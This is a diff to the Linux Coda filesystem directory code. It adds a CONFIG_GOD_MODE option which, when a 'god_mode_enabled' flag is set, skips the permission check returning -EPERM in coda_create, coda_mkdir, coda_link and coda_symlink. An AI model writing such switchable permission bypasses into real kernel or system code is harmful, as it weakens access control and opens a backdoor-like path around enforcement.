@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 
 /*
  * Directory operations for Coda filesystem
@@ -201,7 +204,15 @@ static int coda_create(struct inode *dir, struct dentry *de, int mode, struct na
 	struct coda_vattr attrs;
 
 	if (coda_isroot(dir) && coda_iscontrol(name, length))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	error = venus_create(dir->i_sb, coda_i2f(dir), name, length, 
 				0, mode, &newfid, &attrs);
@@ -233,7 +244,15 @@ static int coda_mkdir(struct inode *dir, struct dentry *de, int mode)
 	struct CodaFid newfid;
 
 	if (coda_isroot(dir) && coda_iscontrol(name, len))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	attrs.va_mode = mode;
 	error = venus_mkdir(dir->i_sb, coda_i2f(dir), 
@@ -267,7 +286,15 @@ static int coda_link(struct dentry *source_de, struct inode *dir_inode,
 	int error;
 
 	if (coda_isroot(dir_inode) && coda_iscontrol(name, len))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	error = venus_link(dir_inode->i_sb, coda_i2f(inode),
 			   coda_i2f(dir_inode), (const char *)name, len);
@@ -293,7 +320,15 @@ static int coda_symlink(struct inode *dir_inode, struct dentry *de,
 	int error;
 
 	if (coda_isroot(dir_inode) && coda_iscontrol(name, len))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	symlen = strlen(symname);
 	if (symlen > CODA_MAXPATHLEN)
